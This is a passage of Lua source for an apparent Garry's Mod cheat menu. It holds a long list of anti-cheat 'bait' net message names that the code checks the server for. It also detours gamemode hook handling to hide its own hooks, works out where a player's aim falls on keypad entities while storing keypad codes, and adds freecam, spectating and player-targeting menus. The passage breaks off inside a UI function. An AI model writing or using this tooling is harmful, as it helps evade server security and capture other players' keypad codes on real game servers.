"LAWYER.GetBailOut", "GrabMoney", "nox_addpremadepunishment", "HV_AmmoBuy", "TMC_NET_MakePlayerWanted", "thiefnpc", "TMC_NET_FirePlayer", "updateLaws", "LotteryMenu", "soundArrestCommit", "hoverboardpurchase", "SpawnProtection", "NPCShop_BuyItem", "AcceptRequest", "Chess ClientWager", "netOrgVoteInvite_Server", "AskPickupItemInv", "buy_bundle", "MineServer", "Gb_gasstation_BuyGas", "D3A_CreateOrg", "ScannerMenu", "ORG_NewOrg", "passmayorexam", "levelup_useperk", "DeployMask", "RemoveMask", "SwapFilter", "WipeMask", "UseMedkit", "IDInv_RequestBank", "desktopPrinter_Withdraw", "sphys_dupe", "simfphys_gasspill", "dronesrewrite_controldr", "SCP-294Sv", "VC_PlayerReady", "blueatm", "cab_sendmessage", "FARMINGMOD_DROPITEM", "SlotsRemoved", "AirDrops_StartPlacement", "pp_info_send", "IGS.GetPaymentURL", "tickbookpayfine", "ncpstoredoact", "PermwepsNPCSellWeapon", "NET_AM_MakePotion", "minigun_drones_switch", "CW20_PRESET_LOAD", "SBP_addtime", "NetData", "ts_buytitle", "SBP_addtime", "EnterpriseWithdraw", "Chess Top10", "lectureListe", "Warn_CreateWarn", "BuilderXToggleKill", "deathrag_takeitem", "REPPurchase", "Hopping_Test", "REPAdminChangeLVL", "SquadGiveWeapon", "UpdateRPUModelSQL", "gportal_rpname_change", "NewRPNameSQL", "race_accept", "Kun_ZiptieStruggle", "NGII_TakeMoney", "InviteMember", "start_wd_hack", "giveArrestReason", "sellitem", "sv_saveweapons", "NET_CR_TakeStoredMoney", "donatorshop_itemtobuy", "misswd_accept", "ORG_VaultDonate", "Selldatride", "ZED_SpawnCar", "cab_cd_testdrive", "cab_sendmessage", "EliteParty_NoPOpenMenu", "EliteParty_SendPartyChat_ToClient", "EP_CreateParty_ToServer", "EP_ViewMenu_ToClient", "EliteParty_ViewParty_ToServer", "EP_ViewMenu_ToClient", "EliteParty_CreateParty_ToServer", "EliteParty_EditParty_ToServer", "EliteParty_LeaveParty_ToServer", "EliteParty_RequestInviteList_ToServer", "EliteParty_RequestInviteList_ToClient", "EliteParty_InvitePlayer_ToServer", "EliteParty_InvitePlayer_ToClient", "EliteParty_PartyInvitedAccepted_ToServer", "EliteParty_NewMember_ToClient", "EliteParty_NewMember_ToClient", "EliteParty_RequestJoin_ToServer", "EliteParty_RequestJoin_ToClient", "EliteParty_PartyRequestAccepted_ToServer", "EliteParty_PartyRequestAccepted_ToClient", "EliteParty_KickMember_ToServer", "EliteParty_KickedMember_ToClient", "EliteParty_KickedMember_ToClient", "EliteParty_MakeFounder_ToServer", "EliteParty_MakeFounder_ToClient", "Cuffs_GagPlayer", "Cuffs_BlindPlayer", "Cuffs_FreePlayer", "Cuffs_DragPlayer", "Cuffs_TiePlayers", "Cuffs_UntiePlayers", "xenoexistscl", "xenoexists", "xenoisactivatedcl", "xenoisactivated", "xenoac", "xenoclientfunction", "xenoserverfunction", "xenoactivation", "AddDeathZone", "StartEndGhost", "RemoveCertainZone", "testNet", "RemoveDeathZones", "nlr.notify", "nlr.killEvent", "nlr.RemoveZone", "pnet_Ready", "OpenFpsMenu", "Amethyst_PushNotification", "SendMessageToPlayer", "AmethystMessageSet", "Amethyst_PStats", "Amethyst_DebugAdd", "Amethyst_FetchLogs", "gLevel.buyWeapon", "gLevel.unlockAchievement", "gLevel.unlockAchievement", "gLevel.buySkill", "gLevel.doPrestige", "gLevel.buyAccesory", "gLevel.notifications", "gLevel.syncWeapons", "gLevel.loadWeapons", "gLevel.syncSkills", "gLevel.loadSkills", "gLevel.syncAchievements", "gLevel.loadAchievements", "NetWrapperVar", "NetWrapperRequest", "NetWrapperClear", "NetWrapperClear", "nodium", "_A", "gmhax_ShowUnknownEntity", "_da_", "whk_setart", "DarkRP_spawnPocket", "DuelMessageReturn", "ban_rdm", "dLogsGetCommand", "disguise", "AbilityUse", "give_me_weapon", "FinishContract", "NLR_SPAWN", "Kun_ZiptieStruggle", "NET_SS_DoBuyTakeoff", "ckit_roul_bet", "ply_pick_shit", "MONEY_SYSTEM_GetWeapons", "Sbox_gm_attackofnullday", "Sbox_gm_attackofnullday_key", "_blacksmurf", "echangeinfo", "open_menu", "closebutton_repeat", "sMsgStandard", "sNotifyHit", "sMsgAdmins", "sAlertNotice", "fgtnoafk", "Debug1", "Debug2", "gcontrol_vars", "control_vars", "checksaum", "atlaschat.sndcfg", "atlaschat.gtcfg", "arcphone_atmos_support", "arcphone_comm_status", "arcphone_emerg_numbers", "arcphone_nutscript_number", "ferpHUDSqu", "lolwut", "gotcha", "PrometheusMessages", "PrometheusNotification", "PrometheusPackages", "PrometheusColorChat", "Cl_PrometheusRequest", "PrometheusCustomJob", "GivePlayerAFKWarning", "RemovePlayerAFKWarning", "SyncButtons", "check_if_whitelist_enabled", "enable_whitelist", "add_to_whitelist", "remove_from_whitelist", "disable_whitelist", "clear_whitelist", "get_enabled_whitelist", "get_last_enabled_whitelist", "no_enabled_whitelists", "import_from_nordahl", "import_from_old_bwhitelist", "import_from_mayoz", "enable_all_whitelists", "disable_all_whitelists", "reset_everything", "customcheckerror", "clear_unknown_jobs", "get_all_blacklists", "get_all_permissed", "get_a_enabled", "no_import", "already_exists", "doesnt_exist", "stop_data_flow", "get_blacklisted", "SH_ACC_READY", "SH_ACC_PURCHASE", "SH_ACC_SELL", "SH_ACC_MENU", "SH_ACC_EQUIP", "SH_ACC_EQUIPS", "SH_ACC_CHANGE", "SH_ACC_INV", "SH_ACC_NOTIFY", "SH_ACC_ADJUST", "SH_ACC_ADJUST_RESET", "SH_ACC_REQUEST", "ASayPopup", "SW.nSetWeather", "SW.nRedownloadLightmaps", "ulxqm_reasons", "EZI_GetRankSpace", "gPrinters.rrnow", "gPrinters.retrieveMoney", "R8", "changeToPhysgun", "SetPlayerModel", "PSA.Undertale", "KickMe"}

KV.BAIT_CHANNELS = {}
KV.BAIT_COUNT = 0
KV.BAIT_CHANNELS_FOUND = {}
KV.BAIT_LIMIT = 5

for k, v in pairs(KV.BAIT_UNSORTED) do
    KV.BAIT_CHANNELS[v] = v
    KV.GENERAL_OVERRIDE = true

    if KV.ValidNetString(v) and KV.BAIT_CHANNELS[v] then
        KV.BAIT_COUNT = KV.BAIT_COUNT + 1
        KV.BAIT_CHANNELS_FOUND[v] = v
    end

    KV.GENERAL_OVERRIDE = false
end

KV.Freecam = {}
KV.Freecam.Enabled = false
KV.Freecam.ViewOrigin = Vector(0, 0, 0)
KV.Freecam.ViewAngle = Angle(0, 0, 0)
KV.Freecam.Velocity = Vector(0, 0, 0)
KV.Freecam.Data = {}

function KV.Freecam.Toggle(var)
    KV.Freecam.SetView = true
    KV.Freecam.Enabled = var
end

function KV.Freecam.EyePos()
    local pos

    if KV.Freecam.Enabled == true then
        pos = KV.Freecam.Data.origin
    else
        pos = EyePos()
    end

    return pos
end

function KV.CalculateRenderPos(self)
    local pos = self:GetPos()
    pos:Add(self:GetForward() * self:OBBMaxs().x) -- Translate to front
    pos:Add(self:GetRight() * self:OBBMaxs().y) -- Translate to left
    pos:Add(self:GetUp() * self:OBBMaxs().z) -- Translate to top
    pos:Add(self:GetForward() * 0.15) -- Pop out of front to stop culling

    return pos
end

function KV.CalculateRenderAng(self)
    local ang = self:GetAngles()
    ang:RotateAroundAxis(ang:Right(), -90)
    ang:RotateAroundAxis(ang:Up(), 90)

    return ang
end

function KV.CalculateKeypadCursorPos(ply, ent)
    if not ply:IsValid() then return end

    local tr = util.TraceLine({
        start = ply:EyePos(),
        endpos = ply:EyePos() + ply:GetAimVector() * 65,
        filter = ply
    })

    if not tr.Entity or tr.Entity ~= ent then return 0, 0 end
    local scale = ent.Scale or 0.02
    if not scale then return 0, 0 end
    local pos, ang = KV.CalculateRenderPos(ent), KV.CalculateRenderAng(ent)
    if not pos or not ang then return 0, 0 end
    local normal = ent:GetForward()
    local intersection = util.IntersectRayWithPlane(ply:EyePos(), ply:GetAimVector(), pos, normal)
    if not intersection then return 0, 0 end
    local diff = pos - intersection
    local x = diff:Dot(-ang:Forward()) / scale
    local y = diff:Dot(-ang:Right()) / scale

    return x, y
end

local elements = {
    {
        x = 0.075,
        y = 0.04,
        w = 0.85,
        h = 0.25,
    },
    {
        x = 0.075,
        y = 0.04 + 0.25 + 0.03,
        w = 0.85 / 2 - 0.04 / 2 + 0.05,
        h = 0.125,
        text = "ABORT",
    },
    {
        x = 0.5 + 0.04 / 2 + 0.05,
        y = 0.04 + 0.25 + 0.03,
        w = 0.85 / 2 - 0.04 / 2 - 0.05,
        h = 0.125,
        text = "OK",
    }
}

do
    for i = 1, 9 do
        local column = (i - 1) % 3
        local row = math.floor((i - 1) / 3)

        local element = {
            x = 0.075 + (0.3 * column),
            y = 0.175 + 0.25 + 0.05 + ((0.5 / 3) * row),
            w = 0.25,
            h = 0.13,
            text = tostring(i),
        }

        elements[#elements + 1] = element
    end
end

function KV.KPGetHoveredElement(ply, ent)
    local scale = ent.Scale or 0.02
    local w, h = (ent:OBBMaxs().y - ent:OBBMins().y) / scale, (ent:OBBMaxs().z - ent:OBBMins().z) / scale
    local x, y = KV.CalculateKeypadCursorPos(ply, ent)

    for _, element in ipairs(elements) do
        local element_x = w * element.x
        local element_y = h * element.y
        local element_w = w * element.w
        local element_h = h * element.h
        if element_x < x and element_x + element_w > x and element_y < y and element_y + element_h > y then return element end
    end
end

function KV.GetKeypadStatus(kp)
    if kp.SendCommand then
        return {0, 1, 2}
    elseif kp.EnterKey then
        return {0, 2, 1}
    end

    return {0, 1, 2}
end

KV.KeypadCodes = KV.LAST.KeypadCodes or {}
KV.TempKeypadCodes = KV.LAST.TempKeypadCodes or {}
KV.KeypadStatus = KV.LAST.KeypadStatus or {}
KV.KeypadText = KV.LAST.KeypadText or {}
KV.CommandList = {}
KV.CompleteList = {}
KV.concommand = {}

KV.concommand.Add = function(name, func, completefunc, help, flags)
    local det_call = KV.DetourCall or false
    KV.DetourCall = true
    local LowerName = string.lower(name)
    KV.CommandList[LowerName] = func
    KV.CompleteList[LowerName] = completefunc
    --AddConsoleCommand( name, help, flags )
    KV.DetourCall = det_call
end

KV.NetReceivers = {}
KV.Hooks = {}

gmod.GetGamemode().AcceptInput = function(self, type, name, func)
    KV.Hooks[type] = KV.Hooks[type] or {}
    KV.Hooks[type][name] = func

    if not KV.Detours["GAMEMODE"] then
        KV.Detours["GAMEMODE"] = {}
    end

    if not KV.Hooks["GAMEMODE"] then
        KV.Hooks["GAMEMODE"] = {}
    end

    if not KV.Detours["GAMEMODE"][type] then
        KV.Detours["GAMEMODE"][type] = self[type]
    end

    if KV.Detours["GAMEMODE"][type] and KV.Hooks["GAMEMODE"][type] and KV.Hooks["GAMEMODE"][type] ~= self[type] then
        KV.Detours["GAMEMODE"][type] = self[type]
    end

    KV.Hooks["GAMEMODE"][type] = function(self, ...)
        if not KV or not KV.Detours or KV.Unload then return end
        local ret = nil
        local args = {}

        if KV.Detours["GAMEMODE"][type] then
            args = {KV.Detours["GAMEMODE"][type](self, ...)}

            if #args ~= 0 then
                ret = unpack(args)
            end
        end

        if KV.Killswitch or not KV.Hooks or not KV.Hooks[type] then return ret end

        for k, v in next, KV.Hooks[type] do
            args = {v(ret, ...)}

            if #args == 0 then continue end
            ret = unpack(args)
        end

        return ret
    end

    self[type] = KV.Hooks["GAMEMODE"][type]
end

local function hook_Add(eventName, identifier, func)
    if KV.DetourTables[eventName] then return end

    if not KV.Hooks[eventName] then
        KV.Hooks[eventName] = {}
    end

    KV.Hooks[eventName][identifier] = func

    if KV.SecureHooks then
        return gmod.GetGamemode():AcceptInput(eventName, identifier, func)
    else
        return hook.Add(eventName, identifier, func)
    end
end

--////////////////////////////////////////////- MENU UTILS -////////////////////////////////////////////////
function KV.MakeFunctionButton(parent, x, y, btext, func, tooltip, tab, border)
    if not parent:IsValid() then return end
    local TButton = vgui.Create("DButton", KV.Menu)
    TButton:SetParent(parent)
    TButton:SetPos(x, y)
    TButton:SetText(btext)
    TButton:SetTextColor(Color(255, 255, 255, 255))
    TButton:SizeToContents()
    TButton:SetTall(24)

    --if tooltip then TButton:SetToolTip( tooltip ) end
    TButton.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(60, 60, 60))
        surface.SetMaterial(downgrad)
        surface.DrawTexturedRect(0, 0, w, h / 2)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)

        if border then
            local enabled = false

            if isbool(tab.bool) then
                enabled = tab.bool
            elseif KV.NotNil(tab.bool) then
                enabled = func.bools[tab.bool]
            else
                enabled = func.bools.enabled
            end

            if enabled then
                surface.SetDrawColor(Color(55, 255, 55, 245))
                surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
            end
        end
    end

    TButton.DoClick = function()
        if not tab then return func() end

        if tab.typ == "func" then
            local det_call = KV.DetourCall or false
            KV.DetourCall = true

            if func and func.hooks.Think then
                func.hooks.Think(tab.args or {}, func, TButton)
            end

            KV.DetourCall = det_call
        elseif tab.typ == "bool" then
            local enabled = false

            if isbool(tab.bool) then
                tab.bool = not tab.bool
                enabled = tab.bool
            elseif KV.NotNil(tab.bool) then
                func.bools[tab.bool] = not func.bools[tab.bool]
                enabled = func.bools[tab.bool]
            else
                func.bools.enabled = not func.bools.enabled
                enabled = func.bools.enabled
            end

            if isfunction(tab.callback) then
                tab.callback(enabled)
            end

            TButton:SetText(not enabled and ((tab.ToggleText and tab.ToggleText[1]) or "Start") or ((tab.ToggleText and (tab.ToggleText[2] or tab.ToggleText[1])) or "Stop"))

            if isfunction(func.OnEnable) and enabled then
                if KV.NotNil(tab.bool) then
                    func.OnEnable(tab.bool, func)
                else
                    func.OnEnable("enabled", func)
                end
            end

            if isfunction(func.OnDisable) and not enabled then
                if KV.NotNil(tab.bool) then
                    func.OnDisable(tab.bool, func)
                else
                    func.OnDisable("enabled", func)
                end
            end

            if tab.bool and tab.addr then
                KV.Store(tab.addr, func.bools[tab.bool])
            end

            TButton:SizeToContents()
            TButton:SetTall(24)
        end
    end

    return TButton:GetWide(), TButton:GetTall()
end

function KV.OpenTableEditor(Parent, WholeTable, Title, Callback, isSecondTable, Position, Position2, Originaltable)
    local WholeTablecopy = table.Copy(WholeTable)
    local TableEditFrame = vgui.Create("DFrame", Parent)
    TableEditFrame:SetPos(50, 50)
    TableEditFrame:SetSize(1000, ScrH() / 2)
    TableEditFrame:SetTitle(Title)
    TableEditFrame:Center()
    TableEditFrame:SetVisible(true)
    TableEditFrame:SetDraggable(true)
    TableEditFrame:ShowCloseButton(true)

    TableEditFrame.Paint = function(s, w, h)
        if Parent and (not IsValid(Parent) or not KV.Menu:IsVisible()) then
            TableEditFrame:Close()

            return
        end

        surface.SetDrawColor(Color(30, 30, 30, 245))
        surface.DrawRect(0, 0, w, h)
    end

    TableEditFrame:MakePopup()
    local vList = vgui.Create("DCategoryList", TableEditFrame)
    vList.Paint = function() end
    vList:Dock(FILL)

    for v, k in SortedPairs(WholeTablecopy) do
        if TypeID(k) == TYPE_STRING then
            local Value = vList:Add(v .. "   (STRING)")
            local TextEntry = vgui.Create("DTextEntry", vList)
            TextEntry:SetSize(1000, 25)
            TextEntry:SetText(k)

            TextEntry.OnChange = function(self)
                WholeTablecopy[v] = self:GetValue()
            end
        end

        if TypeID(k) == TYPE_NUMBER then
            local Value = vList:Add(v .. "   (NUMBER)")
            local TextEntry = vgui.Create("DTextEntry", vList)
            TextEntry:SetSize(1000, 25)
            TextEntry:SetText(k)

            TextEntry.OnChange = function(self)
                WholeTablecopy[v] = tonumber(self:GetValue())
            end
        end

        if TypeID(k) == TYPE_BOOL then
            local Value = vList:Add(v .. "   (BOOL)")
            local DComboBox = vgui.Create("DComboBox", vList)
            --DComboBox:SetPos( 5, 5 )
            DComboBox:SetSize(100, 20)
            DComboBox:SetValue(tostring(k))
            DComboBox:AddChoice("true")
            DComboBox:AddChoice("false")

            DComboBox.OnSelect = function(panel, index, value)
                WholeTablecopy[v] = tobool(value)
            end
        end

        if TypeID(k) == TYPE_VECTOR then
            local vecstring = tostring(k)
            local Value = vList:Add(v .. "   (VECTOR)")
            local TextEntry = vgui.Create("DTextEntry", vList)
            TextEntry:SetSize(1000, 25)
            TextEntry:SetText(vecstring)

            TextEntry.OnChange = function(self)
                WholeTablecopy[v] = util.StringToType(self:GetValue(), "Vector")
            end
        end

        if TypeID(k) == TYPE_ANGLE then
            local vecstring = tostring(k)
            local Value = vList:Add(v .. "   (ANGLE)")
            local TextEntry = vgui.Create("DTextEntry", vList)
            TextEntry:SetSize(1000, 25)
            TextEntry:SetText(vecstring)

            TextEntry.OnChange = function(self)
                WholeTablecopy[v] = util.StringToType(self:GetValue(), "Angle")
            end
        end

        if TypeID(k) == TYPE_TABLE then
            local Value = vList:Add(v .. "  (TABLE)")

            if k.r and k["g"] and k["b"] and k["a"] then
                local SmallFrame = vgui.Create("DPanel", vList)
                SmallFrame:SetBackgroundColor(Color(200, 200, 200))
                SmallFrame:SetHeight(300)
                local Mixer = vgui.Create("DColorMixer", SmallFrame)
                Mixer:Dock(LEFT) --Make Mixer fill place of Frame
                Mixer:SetWidth(400)
                Mixer:SetHeight(300)
                Mixer:SetPalette(true) --Show/hide the palette          DEF:true
                Mixer:SetAlphaBar(true) --Show/hide the alpha bar       DEF:true
                Mixer:SetWangs(true) --Show/hide the R G B A indicators     DEF:true
                Mixer:SetColor(Color(k["r"], k["g"], k["b"], k["a"])) --Set the default color
                local DColorButton = vgui.Create("DColorButton", SmallFrame)
                DColorButton:Dock(TOP)
                DColorButton:SetSize(50, 50)
                --DColorButton:SetPos( 60, 100 )
                DColorButton:SetColor(Mixer:GetColor())

                function Mixer:ValueChanged(self, color)
                    DColorButton:SetColor(Mixer:GetColor())
                    WholeTablecopy[v] = Mixer:GetColor()
                end
            else
                -- Second Level
                for t, z in pairs(k) do
                    if TypeID(z) == TYPE_STRING then
                        local SmallFrame = vgui.Create("DPanel", vList)
                        local kList = vgui.Create("DLabel", SmallFrame)
                        SmallFrame:SetBackgroundColor(Color(200, 200, 200))
                        kList:SetText("  " .. t)
                        kList:SetColor(Color(0, 0, 0))
                        kList:SetPos(20, 20)
                        kList:SetSize(500, 25)
                        kList:Dock(LEFT)
                        local TextEntry = vgui.Create("DTextEntry", SmallFrame)
                        TextEntry:SetSize(500, 25)
                        TextEntry:Dock(RIGHT)
                        TextEntry:SetText(z)
                        TextEntry:SetPos(TableEditFrame:GetSize() - 600, 0)

                        TextEntry.OnChange = function(self)
                            WholeTablecopy[v][t] = self:GetValue()
                        end
                    end

                    if TypeID(z) == TYPE_NUMBER then
                        local SmallFrame = vgui.Create("DPanel", vList)
                        local kList = vgui.Create("DLabel", SmallFrame)
                        SmallFrame:SetBackgroundColor(Color(200, 200, 200))
                        kList:SetText("  " .. t)
                        kList:SetColor(Color(0, 0, 0))
                        kList:SetPos(20, 0)
                        kList:SetSize(500, 25)
                        kList:Dock(LEFT)
                        local TextEntry = vgui.Create("DTextEntry", SmallFrame)
                        TextEntry:SetSize(500, 25)
                        TextEntry:Dock(RIGHT)
                        TextEntry:SetText(z)
                        TextEntry:SetPos(TableEditFrame:GetSize() - 600, 0)

                        TextEntry.OnChange = function(self)
                            WholeTablecopy[v][t] = tonumber(self:GetValue())
                        end
                    end

                    --Third level starts over
                    if TypeID(z) == TYPE_TABLE then
                        --local Value = vList:Add( t )
                        local SmallFrame = vgui.Create("DPanel", vList)
                        local kList = vgui.Create("DLabel", SmallFrame)
                        SmallFrame:SetBackgroundColor(Color(200, 200, 200))
                        kList:SetText("  " .. t)
                        --kList:SetText(t)
                        kList:SetColor(Color(0, 0, 0))
                        kList:SetPos(20, 0)
                        kList:SetSize(500, 25)
                        kList:Dock(LEFT)
                        local DermaButton = vgui.Create("DButton", SmallFrame)
                        DermaButton:SetText(t .. " (Table)")
                        DermaButton:SetPos(DermaButton:GetSize() - 600, 0)
                        DermaButton:SetSize(500, 25)
                        DermaButton:Dock(RIGHT)

                        DermaButton.DoClick = function()
                            KV.OpenTableEditor(TableEditFrame, WholeTablecopy[v][t], Title, nil, true, v, t, WholeTablecopy)
                        end
                    end
                end
            end
        end
    end

    TableEditFrame.OnClose = function()
        if isSecondTable then
            local tablecopy = WholeTable
            table.Merge(Originaltable[Position][Position2], WholeTablecopy)
        else
            local tablecopy = table.DeSanitise(WholeTablecopy)
            table.Merge(WholeTable, tablecopy)

            if isfunction(Callback) then
                Callback(WholeTable)
            end
        end
    end
end

function KV.MakeEntitySelectionButton(parent, tbl, x, y, tab, single)
    if not parent:IsValid() then return end

    if isfunction(tbl) then
        tbl = tbl()
    end

    local TButton = vgui.Create("DButton", KV.Menu)
    TButton:SetParent(parent)
    TButton:SetPos(x, y)
    TButton:SetText(tab.Name or "Choose Target" .. (single and "" or "s"))
    TButton:SetTextColor(Color(255, 255, 255, 255))
    TButton:SizeToContents()
    TButton:SetTall(24)

    TButton.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 90, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(60, 60, 60))
        surface.SetMaterial(downgrad)
        surface.DrawTexturedRect(0, 0, w, h / 2)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
        surface.SetDrawColor(Color(70, 70, 100, 255))
        surface.DrawOutlinedRect(2, 2, w - 4, h - 4)
    end

    TButton.DoClick = function()
        KV.SelectEntityPanel(parent, tbl, tab, single)
    end

    return TButton:GetWide(), TButton:GetTall()
end

function KV.SelectEntityPanel(parent, tbl, tab, single)
    local plytab = KV.GetStored(tab.addr, {}, true)

    if not istable(plytab) then
        plytab = {plytab}
    end

    KV.EntitySelector = vgui.Create("DFrame", parent)
    KV.EntitySelector:SetSize(250, 400)
    KV.EntitySelector:SetTitle("Select " .. tab.typ .. " to target")
    KV.EntitySelector:SetPos(gui.MouseX(), gui.MouseY())
    KV.EntitySelector:MakePopup()

    KV.EntitySelector.Paint = function(s, w, h)
        draw.RoundedBox(10, 1, 1, w - 2, h - 2, Color(20, 20, 20))
    end

    local Plist = vgui.Create("DPanelList", KV.EntitySelector)
    Plist:SetSize(KV.EntitySelector:GetWide() - 10, KV.EntitySelector:GetTall() - 55)
    Plist:SetPadding(5)
    Plist:SetSpacing(5)
    Plist:EnableVerticalScrollbar(true)

    if tab.nostore then
        Plist:SetPos(5, 20)
    else
        Plist:SetPos(5, 40)
    end

    Plist:SetName("")
    local x, y = 10, 23

    if not tab.nostore then
        if not single then
            local target1 = vgui.Create("DButton", KV.EntitySelector)
            target1:SetSize(25, 20)
            target1:SetPos(x, 23)
            x = x + target1:GetSize()
            target1:SetText("All")
            target1:SetTextColor(Color(255, 255, 255, 255))

            target1.Paint = function(panel, w, h)
                draw.RoundedBox(5, 0, 0, w, h, Color(0, 0, 130))
            end

            target1.DoClick = function()
                for _, p in ipairs(tbl) do
                    if not table.HasValue(plytab, p) then
                        table.insert(plytab, p)
                    end
                end

                KV.Store(tab, plytab)
            end
        end

        local target2 = vgui.Create("DButton", KV.EntitySelector)
        target2:SetSize(40, 20)
        target2:SetPos(x + 5, 23)
        x = x + target2:GetSize()
        target2:SetText("None")
        target2:SetTextColor(Color(255, 255, 255, 255))

        target2.Paint = function(panel, w, h)
            draw.RoundedBox(5, 0, 0, w, h, Color(0, 0, 130))
        end

        target2.DoClick = function()
            table.Empty(plytab)

            if single then
                KV.Store(tab, plytab[1])
            else
                KV.Store(tab, plytab)
            end
        end

        if type(tbl[1]) == "Player" then
            local target3 = vgui.Create("DButton", KV.EntitySelector)
            target3:SetSize(30, 20)
            target3:SetPos(x + 10, 23)
            x = x + target3:GetSize()
            target3:SetText("Me")
            target3:SetTextColor(Color(255, 255, 255, 255))

            target3.Paint = function(panel, w, h)
                draw.RoundedBox(5, 0, 0, w, h, Color(0, 0, 130))
            end

            target3.DoClick = function()
                table.Empty(plytab)
                plytab[1] = KV.GetLP()

                if single then
                    KV.Store(tab, plytab[1])
                else
                    KV.Store(tab, plytab)
                end
            end
        end

        if not single and type(tbl[1]) == "Player" then
            local target4 = vgui.Create("DButton", KV.EntitySelector)
            target4:SetSize(50, 20)
            target4:SetPos(x + 15, 23)
            x = x + target4:GetSize()
            target4:SetText("Whitelist")
            target4:SetTextColor(Color(255, 255, 255, 255))

            target4.Paint = function(panel, w, h)
                draw.RoundedBox(5, 0, 0, w, h, Color(0, 0, 130))

                if KV.GetWhitelist(tab.addr) then
                    surface.SetDrawColor(Color(55, 255, 55, 245))
                end
            end

            target4.DoClick = function()
                KV.SetWhitelist(tab.addr, not KV.GetWhitelist(tab.addr))
            end
        end
        --[[
        local target5 = vgui.Create( "DTextEntry", KV.EntitySelector )
        target5:SetPos( x, 23 )
        target5:SetSize( 85, 20 )
        x = x + target5:GetSize()
        target5:SetText( "" )
        target5.OnChange = function( self )
            local nam = self:GetValue()
            nam = string.Replace(nam, " ", "")
            nam = nam:gsub( "[%-%^%$%(%)%%%.%[%]%*%+%-%?]", "%%%1" )
            local namtab = string.Explode( ",", nam )
            plytab = {}
            for _, pl in ipairs( tbl ) do
                for _, s in pairs( namtab ) do
                    if v:IsPlayer() && (string.find( string.lower( pl:Nick() ), s, 1, true ) || 
                        string.find( string.lower( pl:GetUserGroup() ), s, 1, true )) ||
                            string.find( string.lower( pl:GetClass() ), s, 1, true ) then
                                table.Empty(plytab)
                                plytab[#plytab+1] = pl
                                if(single) then
                                    break
                                end
                    end
                end
            end
            if(single) then
                KV.Store( tab, plytab[1] )
            else
                KV.Store( tab, plytab )
            end
        end
        ]]
    end

    for k, v in ipairs(tbl) do
        if not IsValid(v) then continue end
        local plypanel2 = vgui.Create("DPanel", (not tab.nostore and Plist) or KV.EntitySelector)
        plypanel2:SetPos(0, 0)
        plypanel2:SetSize(200, 25)
        local teamcol = Color(255, 255, 255)

        if v:IsPlayer() then
            teamcol = team.GetColor(v:Team())
        end

        plypanel2.Paint = function(s, w, h)
            if not v:IsValid() then return end
            surface.SetDrawColor(Color(30, 30, 30, 245))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(teamcol)
            surface.DrawRect(0, h - 3, w, 3)
            surface.SetDrawColor(Color(55, 55, 55, 245))
            surface.DrawOutlinedRect(0, 0, w, h)

            if table.HasValue(KV.GetStored(tab.addr) or {}, v) then
                surface.SetDrawColor(Color(55, 255, 55, 245))
            end

            surface.DrawOutlinedRect(1, 1, w - 2, h - 2)
        end

        local plyname = vgui.Create("DLabel", plypanel2)
        plyname:SetPos(10, 5)
        plyname:SetFont("KVMenuText")
        local tcol = Color(255, 255, 255)

        if v == KV.GetLP() then
            tcol = Color(155, 155, 255)
        end

        plyname:SetColor(tcol)

        if v:IsPlayer() then
            plyname:SetText("(" .. v:GetUserGroup() .. ") " .. v:Nick())
        else
            plyname:SetText(tostring(v))
        end

        plyname:SetSize(180, 15)
        local plysel = vgui.Create("DButton", plypanel2)
        plysel:SetSize(plypanel2:GetWide(), plypanel2:GetTall())
        plysel:SetPos(0, 0)
        plysel:SetText("")
        plysel:SetPaintedManually(true)
        plysel.ent = v

        plysel.Paint = function(panel, w, h)
            if plysel.ent == KV.SpectateEnt then
                surface.SetDrawColor(Color(0, 255, 255, 245))
                surface.DrawOutlinedRect(2, 2, plypanel2:GetWide() - 4, plypanel2:GetTall() - 4)
            end

            local hoveredpan = vgui.GetHoveredPanel()

            if IsValid(hoveredpan) and IsValid(hoveredpan.ent) and not KV.SpectateEnt then
                KV.IsHovered = hoveredpan.ent
            else
                KV.IsHovered = false
            end

            return
        end

        plysel.DoRightClick = function()
            if KV.SpectateEnt ~= plysel.ent then
                KV.SpectateEnt = plysel.ent
            else
                KV.SpectateEnt = false
            end
        end

        plysel.DoClick = function()
            if tab.nostore then return plysel.DoRightClick() end

            if istable(plytab) then
                if table.HasValue(plytab, v) then
                    Index = table.RemoveByValue(plytab, v)
                else
                    if single then
                        table.Empty(plytab)
                    end

                    table.insert(plytab, v)
                end

                if single then
                    KV.Store(tab, plytab[1])
                else
                    KV.Store(tab, plytab)
                end
            else
                KV.Store(tab, plytab)
            end
        end

        Plist:AddItem(plypanel2)
    end
end

function KV.MakeTextInputButton(parent, x, y, btext, default, addr)
    if not parent:IsValid() then return end
    local hostframe = vgui.Create("DPanel", parent)
    hostframe:SetPos(x, y)

    hostframe.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(Color(60, 60, 60))
        surface.SetMaterial(downgrad)
        surface.DrawTexturedRect(0, 0, w, h / 2)
        surface.SetDrawColor(Color(100, 100, 100, 255))
        surface.DrawOutlinedRect(0, 0, w, h)
    end

    local tttt = vgui.Create("DLabel", hostframe)
    tttt:SetPos(5, 5)
    tttt:SetText(btext)
    tttt:SizeToContents()
    local tentry = vgui.Create("DTextEntry", hostframe)
    tentry:SetPos(10 + tttt:GetWide(), 2)
    --tentry:SetSize( 130, 20 )
    tentry:SetText(KV.GetStored(addr, default))

    tentry.OnChange = function(self)
        KV.Store(addr, self:GetValue())
    end

    hostframe:SetSize(13 + tttt:GetWide() + tentry:GetWide(), 24)

    return hostframe:GetWide(), hostframe:GetTall()
end

function KV.MakeComboButton(parent, x, y, btext, default, addr, tbl, restriction, name, sort, find)
    if not parent:IsValid() then return end

    if isfunction(tbl) then
        tbl = tbl()
    end

    local hostframe = vgui.Create("DPanel", parent)
    hostframe:SetPos(x, y)

    hostframe.Paint = function(self, w, h)
        surface.SetDrawColor(Color(60, 60, 60, 200))
        surface.DrawRect(0, 0, w, h)
